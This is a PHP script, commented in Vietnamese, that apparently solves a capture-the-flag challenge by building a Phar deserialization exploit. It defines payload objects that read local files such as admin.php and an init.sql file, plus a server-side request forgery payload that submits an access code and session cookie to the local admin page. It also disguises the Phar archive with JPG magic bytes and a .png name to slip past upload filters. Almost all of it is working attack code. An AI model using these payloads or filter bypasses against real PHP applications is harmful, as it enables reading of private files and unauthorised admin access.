<?php

// 1. Khai báo lại class Requests y hệt như trong source code gốc (delete.php)
class Requests {
    public $url;
    private $options;
    private $postData;
    private $cookie;

    function __construct($url, $postData = '', $cookie = '', $options = array()) {
        $this->url = $url;
        $this->postData = $postData;
        $this->cookie = $cookie;
        $this->options = $options;
    }
}

// ==========================================
// --- GIAI ĐOẠN 1: Payload đọc file (LFR) ---
// ==========================================
// Đọc admin.php để lấy Access Code plaintext
$payload_read_admin = new Requests("file:///var/www/html/admin.php");

// Đọc init.sql để lấy nửa sau của Flag (sau khi xong admin.php thì chạy cái này)
$payload_read_sql = new Requests("file:///docker-entrypoint-initdb.d/init.sql");


// ==========================================
// --- GIAI ĐOẠN 2: Payload SSRF (Lên Admin) ---
// ==========================================
// Thay 'YOUR_ACCESS_CODE' bằng code plaintext bạn đọc được từ admin.php
// Thay cookie bằng PHPSESSID hiện tại của bạn
$payload_ssrf = new Requests(
    "http://127.0.0.1/admin.php",
    "access_code=YOUR_ACCESS_CODE",
    "PHPSESSID=kel94qk24rd9alu8f877m2ms0g"
);


// ==========================================
// CHỌN PAYLOAD BẠN MUỐN TẠO BẰNG CÁCH BỎ COMMENT LỆNH TƯƠNG ỨNG
// ==========================================
$obj = $payload_read_admin; // Chạy cái này đầu tiên
// $obj = $payload_read_sql; // Chạy cái này thứ 2
// $obj = $payload_ssrf;     // Chạy cái này thứ 3


// Xóa file cũ nếu có để tránh lỗi
@unlink("exploit.phar");
@unlink("exploit.png");

// 2. Khởi tạo file Phar
$phar = new Phar("exploit.phar");
$phar->startBuffering();

// Thêm một file bất kỳ vào bên trong (bắt buộc phải có đối với Phar)
$phar->addFromString("test.txt", "test payload");

// 3. Đánh lừa bộ lọc nội dung file (Magic bytes)
// Thêm \xff\xd8\xff\xe0 (Magic bytes của JPG) vào đầu file stub 
// Điều này giúp vượt qua các hàm kiểm tra MIME type nếu server có dùng mime_content_type()
$phar->setStub("\xff\xd8\xff\xe0" . "<?php __HALT_COMPILER(); ?>");

// 4. CHÈN PAYLOAD VÀO METADATA (Đây là nơi quá trình Deserialization xảy ra)
$phar->setMetadata($obj);

$phar->stopBuffering();

// 5. Đổi tên thành đuôi .png để vượt qua kiểm tra đuôi file của report.php
rename("exploit.phar", "exploit.png");

echo "Đã tạo thành công file exploit.png chứa payload!\n";
?>
